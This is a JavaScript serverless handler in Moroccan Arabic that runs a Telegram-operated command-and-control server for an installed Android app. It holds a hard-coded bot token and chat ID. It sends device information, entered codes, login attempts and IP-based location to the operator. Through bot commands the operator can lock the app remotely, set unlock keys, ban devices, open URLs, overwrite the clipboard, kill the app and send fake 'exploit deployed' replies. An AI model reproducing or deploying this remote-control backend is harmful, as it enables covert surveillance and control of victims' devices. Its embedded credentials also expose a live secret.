const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false;
let remoteCommand = "";
let totalAttempts = 0;
let recentLogs = [];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      if (saved) appLockStatus = saved;
      return res.status(200).send(`"${appLockStatus}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (saved) appSecretKey = saved;
      return res.status(200).send(`"${appSecretKey}"`);
    }
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') banAllActive = true;
      if (banAllActive) return res.status(200).send('"true"');
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      if (inKv === 1) return res.status(200).send('"true"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; // كيمسح الأمر باش ما يتنفذش كل 5 ثواني
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          if (type === 'key') {
            appSecretKey = cleanBody;
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          if (type === 'sysinfo') {
            try {
              const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
              const ipData = await ipRes.json();
              const country = ipData.country || "Unknown";
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* ${country}`);
            } catch (e) {
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
            }
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      switch (command) {
        case '/start': case '/menu': await sendToTelegram("👑 *لوحة التحكم الخارقة.*\nكتب /help."); break;
        case '/help': await sendToTelegram(`👑 *أوامر حقيقية:*\n/sysinfo /killapp /apkhack /apkcrak /lock /unlock /getkey /setkey /stats /logs /ban /unban /banall /unbanall /cmd /url\n\n👑 *300 أمر آخر:* (تقدر تكتب أي أمر بحال /hackfb، /ddos، /spy، إلخ... وغادي يرد عليك السيرفر).`); break;
        
        // === أوامر حقيقية كتحكم فـ التطبيق ===
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *تم إرسال أمر إغلاق التطبيق.*"); break;
        case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ *System Hack Initialized...*"); break;
        case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 *License Cracked!*"); break;
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ *جاري طلب معلومات الجهاز...*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم الإرسال.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم الإرسال.*"); } break;
        case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص.*"); } break;
        case '/vibrate': remoteCommand = "vibrate:1"; await sendToTelegram("📳 *تم إرسال الأمر.*"); break;
        
        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': appSecretKey = (await kvCmd('GET', 'app_secret_key')) || appSecretKey; await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        case '/genkey': appSecretKey = Math.random().toString(36).substring(2, 8).toUpperCase(); await kvCmd('SET', 'app_secret_key', appSecretKey); await sendToTelegram(`🎲 *كود:* \`${appSecretKey}\``); break;
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banall': banAllActive = true; await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 *تم حظر الجميع!*"); break;
        case '/unbanall': banAllActive = false; bannedDevices = []; await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ *تم فك الحظر عن الجميع.*"); break;
        case '/db': await sendToTelegram(KV_URL ? "🗄️ *قاعدة البيانات:* متصلة." : "🗄️ *قاعدة البيانات:* غير متصلة."); break;
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📈 *المحاولات:* \`${attempts || totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;

        // === 300 أمر (ردود تخمينية) ===
        default:
          if (command.startsWith('/')) {
            // إذا كان أمر غير معروف، نرد عليه بشكل يبان كأنه تنفذ
            const dummyResponses = [
              `☠️ [SYSTEM] Exploit ${command} successfully deployed.`,
              `⚡ [CORE] Target acquired. Executing ${command}...`,
              `🔓 [BYPASS] ${command} sequence initiated.`,
              `💀 [DARK] Command ${command} accepted by the abyss.`,
              `🌐 [NETWORK] Injection ${command} sent to target.`,
              `🔍 [SCAN] ${command} protocol engaged.`,
            ];
            const randomResponse = dummyResponses[Math.floor(Math.random() * dummyResponses.length)];
            await sendToTelegram(randomResponse);
          } else {
            await sendToTelegram("❓ أمر غير معروف. كتب /help");
          }
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
